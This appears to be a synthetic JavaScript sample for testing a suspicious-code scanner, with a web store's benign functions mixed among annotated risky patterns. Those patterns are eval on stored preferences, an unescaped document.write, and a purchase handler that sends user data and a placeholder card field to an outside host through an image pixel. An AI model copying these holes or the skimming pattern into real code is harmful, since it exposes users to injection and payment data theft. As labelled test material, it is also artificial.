/**
 * Moderately Suspicious JavaScript Example
 * This file contains a mix of normal and suspicious code patterns
 */

// Regular utility function (benign)
function calculateDiscount(price, discountPercentage) {
    return price * (1 - (discountPercentage / 100));
}

// Some suspicious string encoding (moderate risk)
const encodedMessage = btoa("Check system configuration");
console.log(atob(encodedMessage)); // Decodes and logs: "Check system configuration"

// Normal DOM manipulation (benign)
function updateProductPrice(productId, newPrice) {
    const element = document.getElementById(`product-${productId}`);
    if (element) {
        element.textContent = `$${newPrice.toFixed(2)}`;
    }
}

// Environment detection (potentially suspicious)
const isMobile = navigator.userAgent.indexOf("Mobile") > -1;
if (isMobile) {
    console.log("Running on a mobile device");
}

// External URLs - some normal, one suspicious
const apiEndpoints = {
    products: "https://api.mystore.com/products",
    users: "https://api.mystore.com/users",
    analytics: "https://tracking-service.net/collect" // Slightly suspicious
};

// Using document.write (moderately suspicious)
function showNotification(message) {
    document.write(`<div class="notification">${message}</div>`);
}

// Regular data processing (benign)
function processOrderData(order) {
    const total = order.items.reduce((sum, item) => sum + item.price * item.quantity, 0);
    return {
        orderId: order.id,
        customer: order.customer,
        total: total,
        tax: total * 0.07,
        shipping: order.shipping || 5.99
    };
}

// One suspicious eval usage mixed in with normal code
function loadUserPreferences() {
    try {
        const savedPrefs = localStorage.getItem('userPreferences');
        if (savedPrefs) {
            // This is suspicious - using eval on stored data
            return eval('(' + savedPrefs + ')');
        }
    } catch (e) {
        console.error("Error loading preferences:", e);
    }
    return getDefaultPreferences();
}

// Normal function (benign)
function getDefaultPreferences() {
    return {
        theme: 'light',
        fontSize: 'medium',
        notifications: true
    };
}

// Data collection with some suspicious network access
function trackUserActivity(event) {
    const data = {
        event: event,
        timestamp: Date.now(),
        page: window.location.href,
        user: getCurrentUser()
    };
    
    // Normal analytics call
    fetch(apiEndpoints.analytics, {
        method: 'POST',
        body: JSON.stringify(data)
    });
    
    // More suspicious data collection
    if (event === 'purchase') {
        // This looks like it's sending credit card data (suspicious)
        new Image().src = `https://stats-collector.net/pixel?data=${btoa(JSON.stringify(data))}&cc=${getCreditCardInfo()}`;
    }
}

// Normal function to get current user (benign)
function getCurrentUser() {
    return {
        id: sessionStorage.getItem('userId') || 'anonymous',
        lastActive: Date.now()
    };
}

// This function would be flagged (suspicious)
function getCreditCardInfo() {
    // This is just a placeholder, but would be flagged as suspicious
    return '****';
}

// Initialize app (benign)
function init() {
    console.log("Initializing application");
    loadUserPreferences();
    document.addEventListener('click', function(e) {
        trackUserActivity('click');
    });
}

// Run initialization
window.onload = init; 